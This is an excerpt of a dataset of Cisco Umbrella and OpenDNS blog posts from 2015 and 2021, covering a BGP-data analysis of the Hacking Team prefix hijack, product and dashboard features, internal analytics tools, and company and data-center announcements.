"2015-03-12"},
{"website": "Cisco-Umbrella", "title": "How Hacking Team Helped Italian Special Operations Group with BGP Routing Hijack", "author": ["Andree Toonk"], "link": "https://umbrella.cisco.com/blog/how-hacking-team-helped-italian-special-operations-group-with-bgp-routing-hijack", "abstract": "This is a crosspost from our recent acquisition of BGPmon posted here . As part of the Hacking Team fall out and all the details published on wikileaks, it became public knowledge that Hacking Team helped one of their customers Special Operations Group (ROS), regain access to Remote Access Tool (RAT) clients. ROS recommended using BGP hijacking and Hacking Team helped with the setup of new RAT CnC servers. In this post we’ll take a closer look at the exact details of this incident and support the wikileaks findings with BGP data. Raggruppamento Operativo Speciale and Hacking Team The Raggruppamento Operativo Speciale or ROS is the Special Operations Group of the Italian National Military police. The group focuses on investigating organized crime and terrorism. Hacking Team sells its RAT software known as Remote Control System (RCS) to law enforcement and intelligence agencies, ROS included. ROS infected and installed the RCS client on the machines of persons of interest (referred to in the emails as targets). These Remote Access Tools can provide ROS with all kinds of information and typically provide the tool’s operator with full access over a victim’s machine. The RCS clients normally need to check in with a server —for example a machine the clients can get their commands (orders) from— and upload stored data, recorded communications, logged keystrokes, etc. to. The wikileaks emails uncovered how after ROS abruptly lost access to one of its RCS servers and worked together with Hacking Team to recover the loss. Initially, ROS used machines from a provider called Santrex, a well known bulletproof hoster. Brian Krebs dedicates an article about them in Oct 2013 Obviously the RCS clients (also referred to as agents in the wikileaks emails) only work well if they can communicate with the server. If the server becomes unreachable the client essentially becomes an orphan and loses most of its value. This is exactly what happened on July 3rd, 2013 when after nine earlier outages that year, the Santrex IPv4 prefix 46.166.163.0/24 became permanently unreachable. The wikileaks document described how the Italian ROS reached out to Hacking Team to work together on recovering the VPS server that ran on 46.166.163.175. In ROS terminology, the server was called “Anonymizer”. The emails also revealed that this server relays updates to another back end server called “Collector” from which ROS presumably recovers the targets’ data. Hacking Team proposed to ROS to first work with Santrex to bring the VPS back online, so they could subsequently help reconfigure the RCS server to receive updates from the RCS clients (installed on targets’ devices) but that did not follow through. A plan then was devised to make the prefix 46.166.163.0/24 reachable again by annoucing it in BGP. Since the prefix wasn’t announced by Santrex (AS57668) anymore, originating it from a different AS should make the network reachable again. The wikileaks documents show how ROS worked with the Italian network operator AS31034 (aka Aruba S.p.A) to get the prefix announced in BGP and bring up a new “Anonymizer” server with the IP address 46.166.163.175. ROS also was hoping that other Italian ISPs wouldn’t filter that hijacked announcement. When we look at historical BGP data we can confirm that AS31034 (Aruba S.p.A) indeed started to announce the prefix 46.166.163.0/24 starting on Friday, 16 Aug at 2013 07:32 UTC. The wikileaks emails outline how ROS complained to Hacking Team that the IP was reachable only via Fastweb but not yet through Telecom Italia, concluding not all RCS clients were able to connect back to the server immediately, since the prefix was not seen globally. BGP data further confirms this per the visualization below. BGP Network Graph for 46.166.163.0/24 Historical BGP data shows how AS31034 (Aruba S.p.A) started to announce the prefix to its peers via the Milan Internet Exchange and how it became reachable via the peers that then accepted this BGP announcement. The peers below were some of the networks that accepted the announcement and would have had a path to the new ‘fake`RCS server. AS12874 Fastweb AS6939 Huricane electric AS49605 Reteivo.IT AS4589 Easynet AS5396 MC-link Spa After some frustration on ROS’s part due to summer vacation delays, eventually the IP address of the server became reachable again, at least for many Italian networks and the new server was up and running with the same IP address. Hacking Team then stepped in to reinstall and setup a new RCS server on that IP. Consequently, the RCS clients were able to “sync” back in with the server. On Aug 20th the Raggruppamento Operativo Speciale confirms with Hacking Team that it had indeed recovered contact with 3 of the 4 RAT clients. Finally on August 22 at 13:35 UTC the prefix is withdrawn again, which would indicate that the operation was successful and the RAT clients were likely configured to use a different server IP. Source: ripstat.ripe.net. AS31034 46.166.163.175 prefix lifetime. Conclusion As the supporting evidence from historical BGP data concludes, the information revealed in the wikileaks documents is factual and the Italian ROS and Hacking Team did work with the Italian network AS31034 (Aruba S.p.A), to announce 46.166.163.0/24 between Aug 16 and Aug 22. in order to regain access to their RAT clients. This finding further confirms the use of BGP for nefarious purposes similar to the one listed in our blog post earlier this year . BGP hijacks can do serious harm and rapid notification of such an event is essential. BGPmon provides free and premium monitoring services that will inform users in near-real time for events like this.", "date": "2015-07-12"},
{"website": "Cisco-Umbrella", "title": "A Guided Tour of the OpenDNS Umbrella Dashboard", "author": ["Kara Drapala"], "link": "https://umbrella.cisco.com/blog/a-guided-tour-of-the-opendns-umbrella-dashboard", "abstract": "The OpenDNS Umbrella Dashboard is your one-stop shop for controlling the enforcement powered by our extensive threat intelligence. We’re constantly iterating and improving the Dashboard experience to make it as seamless and uncomplicated as possible—however, there are a few insider tips and tricks that will help you get even more from Umbrella. We turn again to OpenDNS technical support engineer, Alexander Harrison, for a behind-the-scenes tour of the Umbrella Dashboard: Overview: Although the overview page might seem fairly basic, it can provide a quick look at your network activity and status. According to Harrison, “this is a great overview and health check. Health check in regards to components syncing, and components working, as well as botnet checks, because the daily email reports are actually only good for networks (for now—improvements are on the way!).” One of the most important sections of the Overview page is, helpfully, right at the top. The Message Center is where our engineers and support teams share announcements, particularly big security threats, and outages. Also, if you have components such as the OpenDNS Virtual Appliance, the Message Center will display any related error messages. “If you have VA components, you should log in at least once a week, to make sure you don’t have any error messages,” Harrison said. “It’s not to say that you will definitely have an issue, it’s just to check and make sure everything is working okay.” You can also find your Activity Volume graph on the Overview page. This graph provides an overview of your traffic volume, and security incidents happening in your network in the last 24 hours. “It’s a great place to see, at a quick glance, what’s going on in your network. Am I seeing a spike in blocks? Am I seeing a spike in malware?” Harrison added one pro tip on reading the graph: “the only confusing thing here is that only the green line represents total traffic—the bars represent different types of security incidents.” Configuration: The configuration page is where you can control the settings for your Umbrella deployment. There are three main areas of interest in the Configuration tab: Policies We’ve talked at length about policies and the Policy Editor here , but in short, this section allows you to control what security settings users, groups, and networks receive. Identities The Identities section allows you to add and manage your users. More specifically, it’s where you need to go to download the Roaming Client, add a network or internal network, or provision an iOS device. Note: Adding an internal network requires a Virtual Appliance. More on installing the VA here . System Settings Finally, System Settings is the tab where you can manage a slew of account options, including user accounts, delegated admin settings, Active Directory settings, log management, and login settings. It’s also where the Internal Domains settings are located, which are an essential part of managing your Umbrella deployment. Harrison comments, “the Internal Domains settings are key—if you are deploying a Roaming Client or Virtual Appliance and you don’t set this up correctly, you will probably run into issues accessing local network resources. These settings will help you route specific domains to your local resolver such as custom local-only domains, preventing long timeouts and general chaos.” “For example,” he continued, “this is especially important for people who use Exchange. Because Exchange communicates via local subdomain, If you use a local domain email, not setting your Internal Domains will cause things to break.” An article documenting adding autodiscover addresses for Office 365 can be found here . Reports: Finally, the Reports tab, which provides admins with in-depth visibility into their networks. The three most important sections of the Reports page are as follows: Activity Search This section provides a real time look into your network activity. The report can be improved by making use of the “Filtering” section, found on the bottom of the left-hand sidebar. (Displayed here on the right.) “Say you’re a big company that does a million requests a day,” Harrison said. “You’re going to see a page full of requests from the last minute in Activity Search. But if you use filters, you can quickly and easily pinpoint problem users or domains within the last 28 days. You can even search a specific timeframe, which can be really useful when you’re doing incident response or forensic analysis.” One note with filtering is that these apply only after clicking “Run Report”. Reports “The Reports section houses several helpful things, especially the Security and Cloud Services reports,” according to Harrison. The Security Report is almost identical to Activity Search, but specifically shows security events, such as botnet and malware requests, without the noise present in Activity Search. The new Cloud Services report is a great overview of cloud apps and IoT devices in your network. We’ve covered this report extensively on the blog before; read the full explainer by clicking the image below. Admin Audit Log “The Admin Audit Log shows changes users have made to the Dashboard,” Harrison said. “This is mostly used during internal forensics investigations, or for managerial purposes.” The OpenDNS Umbrella Dashboard isn’t quite as challenging as some of the other security dashboards in the market today, however, it still has it’s own best practices to follow. Hopefully, this guide has helped you discover a few of the most important ones, but if you still have questions, you can explore the extensive documentation located in the Knowledge Base , or reach our world-class support team here .", "date": "2015-07-23"},
{"website": "Cisco-Umbrella", "title": "OpenDNS Announces Security Alert Tools BGP Stream and DNS Stream", "author": ["Owen Lystrup"], "link": "https://umbrella.cisco.com/blog/opendns-announces-alert-tools-bgp-stream-and-dns-stream-at-blackhat", "abstract": "BGP is gaining renewed attention as a security risk, though it always has been since its invention in the 1980s. Blackhat USA 2015 featured three sessions on BGP alone, and all three had a unifying reinforcement of truths in BGP. The first is, despite being a backbone of the Internet, BGP is highly insecure–as has been highlighted previously . The second is monitoring remains the main method of finding and reacting to outages and attacks on BGP. Wim Remes, manager of strategic services at Rapid7, said BGP is both an easy attack vector and a highly important source of information about ongoing attacks. “I think BGP information is very valuable from a threat intelligence perspective,” he said. “Using BGP information to detect when a hijack is occurring is incredibly valuable.” But while there are options for securing BGP like RPKI and BPGSec, these preventative measures do not yet have wide adoption, which means most service and content providers do not protect against leaks and hijacks. To help close the gap in the lacking resources for BGP issues, OpenDNS CTO Dan Hubbard and Network Engineering Manager Andree Toonk announced a free, real-time feed of BGP outages and hijacks called BGP Stream . The tool will utilize BGPmon’s monitoring engine, and cull the largest and most important events, then post those to a Twitter feed. In addition, the tool will provide links to a site where users can find more contextual information about the events, including a live map of BGP outages. BGP Outage Map from BGPStream.com The duo also announced DNS Stream , a similar service that will monitor for DNS events and publish them to a Twitter feed. The published events will give indicators to DNS attacks and outages in real-time, just like BGP Stream. Hubbard and Toonk see the two services as complementary to each other and can provide a very useful resource for security professionals and network owners. As far as the choice to publish to Twitter, Hubbard emphasized its social nature and the use of real-time publishing. “Twitter is a great way to announce things, and share data. But it’s also a great way to programmatically consume information.” He also added that he hopes this will be a start of a community that shares and announces issues with BGP and DNS, decreasing the disclosure time and making it easier for companies, network owners, and providers to react quicker to outages. Outage message from @BGPStream Follow BGP Stream and DNS Stream on Twitter here and here . You can also check out the BGP Stream portal here .", "date": "2015-08-06"},
{"website": "Cisco-Umbrella", "title": "Hackathon – Visualizing The Life of a Domain", "author": ["Chen Ye"], "link": "https://umbrella.cisco.com/blog/hackathon-visualizing-the-life-of-a-domain", "abstract": "June 25 was the OpenDNS engineering quarterly hackathon, a time when everyone gets to drop everything and work on one project in a single marathon session. For this hackathon, the data visualization team created a new timeline visualization. The idea for the project came from some internal interviews with the research team. The purpose of these interviews were to understand the researchers’ typical workflow and uncover their need toward the data stored within OpenDNS Security Graph. To give a little more context, Security Graph is a tool built by the Security Labs team, sourced from 70+ billion DNS requests that OpenDNS handles each day. Given the size of data, however, one ongoing challenge is deciding how we can represent the data in a manner that will make the work of security researchers and analysts easier. The interviews gave us a number of great insights. One key finding was that the team would like to have a quick view of the important events for a particular domain in addition to how the features evolve over time. The reason for this is that malicious behavior may surface if visualized correctly and succinctly. This finding led us to the idea of creating a timeline visualization. Our goal was to answer the question, “What does the life of a domain look like?” More specifically, our project would visualize the time stamps – including key events and turning points for a domain – whenever it changes (e.g., created or updated) its IP address or name server. The design is guided by Shneiderman’s Mantra of data visualization: Overview First, Zoom and Filter, then Details-on-Demand. The timeline gives the user a look at the whole history of a domain, zoom in and out, and the ability to select the dataset of interest. Furthermore, the user can click on every event on the timeline to expand it and view more detail. To do all this, we selected two JavaScript libraries: D3 and EventDrops . The former is a popular data visualization library, which is suited to create a dynamic and interactive visualization; the latter is another visualization library, but based on D3. EventDrops draws a zoomable, clickable timeline, representing events as circles. We modified the original source code a little to realize every function that we wanted to add. Here is a very good image of what the timeline looks like from the original repository. With the original design and prepared libraries at hand, we developed everything within that single day. The following two images show how we did and what we made: the whole process flow, and our timeline visualization. As you may notice from Figure 1 , all data directly comes from our Investigate APIs. Figure 1. Process Flow Figure 2. Timeline Visualization In Figure 2, “Key Events” displays the dates when events including the target domain occur. For example, the domain is registered, updated, or tagged by OpenDNS. “IP Addresses” represents historical records of the domain, so that the user can see how frequently the domain has changed its IP addresses over a certain period. (Note: as of today, windows7download.com is in our block list and considered as a malicious domain. Please do not attempt to browse to it). During the development, we faced two problems. The first one is overlapping of event circles. This does not matter so much as long as two events do not happen at the exact same time since the visualization supports zoom-in. Yet hours and minutes are not always available in the data, which means that two events will be regarded to occur at the same time if the date is only available. The second problem is that it was hard to represent the start and end dates of an event. If we simply used a rectangle or line to represent this, another overlapping issue would come up here too. That is, multiple rectangles or lines may overlap with each other and it may be difficult to distinguish when the event starts or ends exactly. Since our visualization was built within a single day, those two above are still remaining issues. Solutions to them will be part of our future work on this project. We hope a new version solves all problems, and this visualization will help customers get a quicker, better insight into a domain’s history.", "date": "2015-08-18"},
{"website": "Cisco-Umbrella", "title": "Poseidon: Real-Time HTTP Log Analyzer", "author": ["Jeremiah O'Connor"], "link": "https://umbrella.cisco.com/blog/poseidon-real-time-http-log-analyzer", "abstract": "OpenDNS is known for being a cloud-delivered DNS security company, analyzing around 70 billion DNS requests per day. We also monitor about 10.1 million daily HTTP traffic requests on our proxy , which is maintained by our awesome Cloud Enforcement Team. Since this is a relatively new data set for us, building new data pipelines and processing proper metrics is an important step to gaining visibility and building intuitions about the data. With this in mind, we have created Poseidon, a statistics tool to monitor the network behavior on our proxy. The primary purpose of Poseidon is to process the HTTP logs ingested from our Kafka stream and provide meaningful metrics in order to gain actionable insights over a sliding one-hour window. Some of the statistics it displays are top non-blocked domains, blocked URLs counts, and a trending system over the past hour (updating every five minutes). Poseidon’s trending system is based on time series analysis algorithms. We take the relative average standard deviation per domain over the last hour, then sort through these domains by trending score to obtain the top trending domains and URLs in the observed window (60 minutes), and identify items with the sharpest trends for deeper inspection. Figure 1 is an overview of how Poseidon’s windowing system works: (Figure 1) Poseidon provides supplemental data for our researchers by retrieving classification data from Investigate , for example specific threat attribution scores (e.g., ASN scores, IP scores, and DGA scores). We have also created a display for time series data in a histogram to see the traffic behavior within the time window. Poseidon also monitors and generates statistics for OpenDNS’s new IP blocking feature. Figure 2 is an example of time series histogram, where we can observe the overall counts over the last 1 hr. along with each 5 min. intervals, this helps with identifying sharp changes in traffic and network behavior: (Figure 2) Some of the other fields in the proxy traffic that we are conducting analysis on are the HTTP Referer and User-Agent fields. For example, if there was a specific referer sending users to multiple malicious pages, this may be suspicious. We have deployed a set of rules to match malicious user-agent strings, and have also tied in useragentstring.com’s API to help identify and analyze unknown user-agents. Figures 3 and 4 are screenshots of Poseidon displaying top-counts and displaying overall trending. From this data we can examine user behavior, trends in traffic, and identify outliers in the data: (Figure 3) (Figure 4) The next step for the development of Poseidon is to rebuild it with an analytics platform like Apache Spark to distribute the computations as we deploy more rules, build HTTP detection models, and harvest more network statistics. In addition, we can proxy traffic for domains found from our DNS models and gain more information about them at the HTTP level. This will also be attached to our email alert system in order to send out daily digests of proxy statistics to the team for more in-depth analysis. Using Poseidon, OpenDNS Security Labs increases its ability to detect new and emerging threats. As we discover suspicious domains from our proprietary DNS models, we can selectively proxy the traffic to gain greater insight – including subdomains, paths, filenames, and file extensions. Any identified indicators can then be fed back into our existing threat models, training sets, and alerting systems. The discovered indicators may also serve as the basis for the creation of new threat models or an entirely new vein of research. These are exciting times in the OpenDNS Security Labs. Keep checking back with us as we continue to discover new and interesting threats using our innovative systems.", "date": "2015-08-19"},
{"website": "Cisco-Umbrella", "title": "Cisco and OpenDNS: A New Day in Cloud Security", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/cisco-and-opendns-cloud-security", "abstract": "OpenDNS has gone through many changes in its ten-year history as a leading cloud-delivered network security company. In 2006, the company was launched as a consumer DNS provider. In 2012, the company transitioned to cybersecurity with the release of the Umbrella network security service . Two years later, OpenDNS announced partnerships with some of the biggest IT security vendors in the world. Next, 2015 saw a new set of APIs that allow any customer to integrate any security product with OpenDNS’s global security network. The latest change came on June 30th, when Cisco Systems announced its intent to acquire the company. Today officially marks not only the close of the acquisition, but also the first milestone in our joint efforts to accelerate Cisco’s cloud-delivered security portfolio. OpenDNS, now part of Cisco From the beginning, the partnership between OpenDNS and Cisco has been cited by the press and industry analysts as one that matches the future priorities of a dominant IT powerhouse with the core competencies of a growing, innovative cloud security company. In a special report on Cisco’s security acquisitions, Forrester Research analyst Rick Holland wrote that the OpenDNS acquisition “… upgrades Cisco’s cloud-based security offerings and provides valuable DNS-based threat data.” In a report about Cisco’s recent spate of cybersecurity acquisitions ( Brief: Cisco Continues Its Blistering Security Acquisition Pace With The Addition Of OpenDNS, Forrester Research, August 6, 2015 ), Holland called OpenDNS “… a powerful software-as-a-service (SaaS) security offering, a platform to provide IoT security, a force multiplier for security controls, and powerful threat data for both enrichment and proactive protection.” Holland also pointed out that Cisco is committed to its vision of providing security everywhere and solutions across the extended network. Hilton Romanski, SVP, Chief Strategy Officer at Cisco said in a blog post that the acquisition of OpenDNS helps Cisco grow in two areas: building on the advanced threat detection capabilities already in Cisco’s portfolio and transitioning to a bigger focus on cloud-based cybersecurity solutions. “To build on Cisco’s advanced threat protection capabilities, we plan to continue to innovate a cloud delivered Security platform integrating OpenDNS’ key capabilities to accelerate that work. Over time, we will look to unite our cloud-delivered solutions, enhancing Cisco’s advanced threat protection capabilities across the full attack continuum—before, during and after an attack.” Stacey Higginbotham at Fortune called OpenDNS’s Umbrella offering an “essential service” that will blend well with Cisco’s own network focus and provide a new capability for managing a growing number of security threats. Stories about the planned acquisition consistently focused on the idea that there is significant potential for OpenDNS and Cisco to build integrated security solutions that, someday, will provide customers with services that are more powerful than the sum of their parts. The Future of Cloud Security, Now “Someday,” it seems, is today and that “potential” is now a reality. Announced earlier this morning in a press release on Cisco’s website, OpenDNS has integrated the Cisco AMP Threat Grid malware analysis cloud service with OpenDNS Umbrella. This first integration gives customers of both services the ability to add new malware domains discovered by Threat Grid directly to customers’ Umbrella block lists. The Cisco AMP Threat Grid cloud service securely sources malware from a closed community and analyzes these samples using proprietary techniques that include static and dynamic analysis. Unlike traditional sandboxing technologies, this dynamic malware analysis exists outside of a virtual environment and identifies malicious code that has been designed to evade analysis. This new integration between cloud services provides OpenDNS users with a constantly updated list of the newly identified malicious domains from the latest malware samples available. When a customer sends files to AMP Threat Grid, malicious domains will be automatically added to OpenDNS Umbrella in minutes, with no user interaction. Umbrella will log or block all Internet activity, including data exfiltration, destined to these domains on any device — on or off the corporate network. OpenDNS — Security Everywhere What made this integration possible is something that’s been part of OpenDNS’s company DNA from the start: building a strong foundation for cloud computing. From the ability to quickly design, test and deliver innovative services to its customers over a global cloud network to developing carefully tested APIs that allow any service to integrate with OpenDNS Umbrella, the speed with which the AMP Threat Grid integration was executed demonstrates the value of the OpenDNS vision and the work that has been done by OpenDNS’s engineering team throughout its history. This latest integration is also an example of the platform’s continued ability to move quickly and adapt to a changing security landscape. As the transition plan continues to develop over the coming months, it’s clear that as part of Cisco, the OpenDNS team will continue pushing forward into the future, full-steam ahead. To learn more about how OpenDNS builds on Cisco’s “Security Everywhere” vision, join our webcast on Thursday, September 3rd at 10 a.m. PDT/1 p.m. EDT with David Ulevitch, founder of OpenDNS (and newly appointed Cisco Security Business Group Vice President), and Scott Harrell, Vice President of Product Management, Cisco Security Business Group.", "date": "2015-08-27"},
{"website": "Cisco-Umbrella", "title": "Let's Talk About Proxies", "author": ["Aram Grigorian"], "link": "https://umbrella.cisco.com/blog/lets-talk-about-proxies", "abstract": "Some time ago, my teammate Yariv blogged about the OpenDNS Intelligent Proxy, which allows us to go beyond the DNS layer and block malicious HTTP traffic. Our team has since been focused on other projects, like taking ownership of and consolidating one of the oldest parts of our infrastructure called the landers, which freed up more than 70 servers as a result — as well as some exciting new features we’ll talk about when it’s time. Today I want to go over the Intelligent Proxy — and the technology that powers it — in little more detail, namely Nginx. Conventionally a proxy is configured explicitly, either in your OS’s network settings or within a particular program, like Chrome or Firefox in case of HTTP proxying. In addition, protocols are in place to ensure the proxy server can always determine what the client’s intended destination was at the time of the request. But as Yariv explained in his post, we’ve taken an unconventional approach and instead of proxying everything (explicit or not) we selectively re-route requests to suspicious domains to our proxy via the DNS layer. This selectivity is great for reducing latency, load, and impact but it also introduces some interesting engineering challenges — mainly around identifying users and determining what was the original destination. For example, when a user tries to browse to “some-website.net,” the OpenDNS resolvers return the IP address of the nearest Intelligent Proxy server if the domain is classified as suspicious. The client, e.g. Firefox or Chrome, has no knowledge of this and assumes the IP address it received belongs to the server actually hosting “some-website.net.” In the case of plain HTTP, it’s easy to determine what the original destination was, because HTTP/1.1 requires the Host header to be set with each HTTP request, and modern browsers will correctly include this header. Shared hosting providers, as an example, rely on this header when serving multiple websites behind a single IP. Similarly, HTTPS traffic can be proxied by taking advantage of the Server Name Indication (SNI) extension of the TLS protocol. The process is more complex (even impossible) for other ports and protocols. Another important concept is the idea of a “forward” proxy vs a “reverse” proxy. A forward proxy serves a group of clients, acting as a single point of access and querying origin server(s) on behalf of the clients . This is the type of proxy you use when configuring one in your OS or in a browser like Firefox, as mentioned earlier. A reverse proxy does the opposite and acts as a single point of access for multiple server components, such as CGI scripts, file servers, or databases. These proxies are also commonly used as load balancers and SSL termination points. Based on this, our Intelligent Proxy is a forward proxy when it comes to serving client requests that have been routed to it. But it also has some reverse proxying to do internally, especially as we add new features and new layers of data inspection. I had also mentioned at the beginning that the technology we chose is Nginx, and readers familiar with Nginx will know it’s designed to be purely a reverse proxy. I’ll discuss some more of the unconventional approaches we’ve taken as a result, and challenges we had to solve, in my next post.", "date": "2015-09-18"},
{"website": "Cisco-Umbrella", "title": "Expanding SASE threat protection and cybersecurity package options", "author": ["Kate MacLean"], "link": "https://umbrella.cisco.com/blog/expanding-sase-threat-protection-and-cybersecurity-package-options", "abstract": "The world is shifting towards a more distributed workforce — and, with recent global events, the trend is only accelerating. From big global enterprises to smaller local businesses, and everything in between, people now work anywhere and everywhere, from any and every device. And as data bypasses centralized security, finding a cyber security package that protects these users — and your organization — from cyber threats is more challenging than ever. It may sound scary and overwhelming, but it doesn’t have to be.  Cisco Umbrella has been helping companies of all sizes protect users on and off-network since 2006.  SC Media recently named Cisco best security company for 2021, and Cisco Umbrella Best SME security solution for simplifying the IT environment while providing the best cybersecurity with the highest performance and scalability. We’re excited to offer our customers even more functionality and value with our latest enhancements of Cisco Umbrella, a core component of Cisco’s secure access service edge (SASE) architecture. We are leading the way for a new, integrated approach – one in which networking and security functions are synchronized in a single, unified service that delivers protection and performance wherever employees access the internet or cloud applications. Marrying simplicity and security in a single integrated platform We continue to focus on our core competency: effective security that is simple to deploy and manage. We are committed to helping organizations unlock the power of SASE with an all-in-one service that significantly simplifies security and reduces the cost, time, and resources previously required for deployment, configuration, and integration. By unifying secure web gateway, cloud access security broker, DNS-layer security,  firewall, remote browser isolation and more – we can help you centrally manage protection for all your users and locations from a single dashboard. Today at RSA 2021 we are pleased to announce the following enhancements for Cisco Umbrella: Automated Meraki MX integration that extends the SD-WAN fabric to Umbrella for fast, reliable, secure access to apps* Deeper cloud firewall protection via real-time threat detection/correlation with new (Snort 3) intrusion prevention system * Added protection for high-risk destinations and users with Remote Browser Inspection (RBI) Identification and remediation of malicious files in cloud storage applications with cloud malware detection But wait there’s more! We’re offering more value to customers with new and enhanced packages: New Umbrella SIG Advantage package for the highest level of protection** Enhanced Umbrella SIG Essentials package with additional  protection at no extra cost** Let’s dig into the new capabilities inside Cisco Umbrella: Automated Umbrella-Meraki MX integration, including intelligent path selection for SD-WAN We’ve enhanced our existing integration to further  simplify deployment of cloud security across your SD-WAN fabric. You can automatically set up an encrypted tunnel between Meraki MX devices and Umbrella with a simple click from the Meraki dashboard.  This extends the SD-WAN fabric into Umbrella, making it easy to apply cloud security across thousands of locations. You can now inspect traffic with SSL decryption at a scale not possible with on-premises hardware and protect sensitive data. Intelligent path selection together with Umbrella’s global cloud architecture ensures the fastest, most reliable, and secure path applications regardless of where they are hosted. New intrusion prevention system (IPS) added to the cloud-delivered firewall to block attacks Exploits can happen in real-time and must be detected quickly to ensure fast response, elimination of threats, and reduction of false positives. Umbrella’s cloud-delivered firewall now includes intrusion prevention system (IPS). This additional layer of network security/threat prevention, based on Snort 3 technology, uses signature-based detection to examine network traffic flows and prevent vulnerability exploits. Now you can create firewall policies that analyze outbound traffic flows and take automated actions to catch and drop dangerous packets before they reach their target. Umbrella IPS uses the extensive and continuously expanding signatures (40,000+ and growing) from Cisco Talos, the largest private security threat intelligence organization in the world. Added protection for high-risk destinations and users The need for fast, secure access to the internet and SaaS apps has reached a crescendo. Cisco Umbrella’s remote browser isolation (RBI) provides an added layer of defense against browser-based attacks — without burdening IT or compromising the end user experience. Available in three add-on options to suit your unique needs, remote browser isolation allows high risk users to safely browse websites, while protecting devices and corporate networks from browser-based exploits. Worried about deployment? It’s a snap. IT can deploy quickly without changing existing browser configurations or needing additional plug-ins. In fact,  100% of our customers who participated in our early testing reported “satisfied” or “very satisfied” with RBI testing. They found it to be intuitive and seamless, and said, “the performance is crisp, with video and audio working as expected.” Identification and remediation of malicious files in cloud storage application Stop playing hide and seek with malicious malware.  It’s important to scan cloud storage repositories and ensure that malicious files are eliminated. With cloud malware detection, Cisco Umbrella makes sure cloud storage applications are not compromised by malware. Umbrella detects and removes malware from these apps to prevent the spread of malware infections laterally on your network. You can scan cloud file storage repositories for malware and detect potentially malicious files that are uploaded or edited. Once identified, you can take corrective action to quarantine or delete malicious files, and generate reports on usage, potentially compromised accounts, and potential threats within the network. Cloud malware detection is  part of the SIG Essentials and SIG Advantage packages. In recent testing, customers found it to be effective in finding malicious files in their cloud environments, and said it was easy to ”sort & filter to identify the riskiest files”. Simple and effective security can coexist Securing today’s “work anywhere” organization requires networking and security functions to be synchronized in a single, unified service that delivers protection and performance wherever employees access the internet or cloud applications. And our customers agree. “Cisco Umbrella was unlike any other security product we’d ever seen. By stopping threats at the DNS layer before they can even reach our network, Umbrella could bring that security everywhere Boston Medical’s work happens, regardless of location or device.” Lee Cullivan, CISO, Boston Medical Center5 “If you think about securing your house from a burglar, you want to stop them before they even enter your home. Most of the other competing secure web gateways would let threats get into the network and then fight them inside, but Umbrella stops the threats before they even get in, and that’s a big difference. You can’t ask for anything better than that.” Thierry Tadzong, Senior Network Engineer, Frederick Health In a recent customer survey,  a whopping 82% of our customers recently surveyed [link to TechValidate survey]  said that they saw value after deploying Cisco Umbrella in less than a week. Nearly two-thirds of the respondents reduced malware infections by 75% with Cisco Umbrella. Three-fourths of the participants stated that “fast and easy deployment” is the top benefit of using Cisco Umbrella. New and enhanced Umbrella packages for the best protection and value In the end, whatever we do, we must make sure that we make it easy for your team to consume and manage our service. Our new SIG Advantage package offers the most complete set of security capabilities in a single subscription to help you meet the highest levels of security. It offers tremendous value because it is easy to consume and enables you to reduce significant complexities otherwise associated with purchasing and unifying point solutions. It is especially useful if you believe in the promise of SASE! Don’t worry if you don’t need all these capabilities yet. We also enhanced our SIG Essentials package to include cloud malware detection and increased file malware analysis at no extra cost. We want to make sure that you can protect your environment with the latest and greatest innovations at Cisco. Learn more To learn more about the announcement we shared at RSA 2021, watch this video . You can also read more about what’s new on our website . * Early availability currently limited to select customers ** Available in July 2021", "date": "2021-05-17"},
{"website": "Cisco-Umbrella", "title": "Cisco Umbrella launches new data center in Madrid, Spain", "author": ["Andrea Gross"], "link": "https://umbrella.cisco.com/blog/cisco-umbrella-launches-new-data-center-in-madrid-spain", "abstract": "Cisco Umbrella is proud to announce the addition of our most recent global cloud data center, Spain! Our DC is located in Silicon Alley, not to be confused with Silicon Valley. We chose this location because it resides in the heart of connectivity and high-tech industry in Madrid. Improved cybersecurity services for our Spanish and European customers When selecting cybersecurity data center locations, we look at several criteria, including the number of users in that region and the transit and peering options that define our ability to improve service for our users. There are over 70 carriers, IPS, and CDNs in the same DC complex, alongside Cisco Umbrella. Adding this data center to our architecture means customers have closer access to the cloud anytime, anywhere, providing additional opportunities to process usage and event data locally. Madrid is the second largest city in the EU (3.3M people within the city limits!) – this data center location has grown to be one of the most important gateways to North and South America, along with other major European markets. Cisco Umbrella and its global cloud cybersecurity architecture is a key component of Cisco’s Secure Access Service Edge (SASE) offering. Learn more about SASE with our At a Glance . Cisco Umbrella helps unify firewall, Secure Web Gateway (SWG), DNS-layer security, Cloud Access Security Broker (CASB), and threat intelligence into a single cloud service – allowing businesses of all sizes to secure their users everywhere they work. Traffic latency decreases with the optimal usage of a hybrid multi-cloud infrastructure – maximizing resilience. Anycast routing intelligently directs traffic to the closest Umbrella data center, bypassing degraded or unavailable links automatically. Imagine a built-in customer assistant providing you with the best possible availability, reliability, and quality. There is no longer a need to manage load balancers, routing policies or configure files. When planned maintenance or unplanned interruptions occur, failover happens automatically and maintains redundancy. Umbrella peers directly with more than 1000 organizations to continuously boost performance and help ensure the fastest route for requests by creating shortcuts through the internet topography for our customers’ encrypted traffic. By utilizing more than 6000 peering sessions with partners like Netflix, Google, and Facebook (just to name a few), we decrease latency and improve performance between our customers and their networks. Cybersecurity data centers for Cisco Umbrella, like Madrid, Spain are intentionally located near the Internet Exchange Points (IXPs) for faster, more reliable service. These data centers are carrier-neutral, selected purely on the location’s ability to provide the best quality connections and services to the regions served. All Cisco Umbrella data centers meet or exceed Uptime Institute Tier III standards , meet all common security compliance standards (ISO27001/SOC2), and are General Data Protection Regulation (GDPR) compliant. In addition to meeting and exceeding all compliance standards, we also want to ensure we operate as a greener organisation while working to build a sustainable model for the future. The new data center in Madrid is LEED (Leadership in Energy and Environmental Design) Gold certified for sustainability – this certification is the result of continued advocacy for environmentalism and the reduction of our carbon footprint. We invite you to learn more about how the Cisco Umbrella global cloud architecture brings cloud access closer to you.", "date": "2021-05-13"},
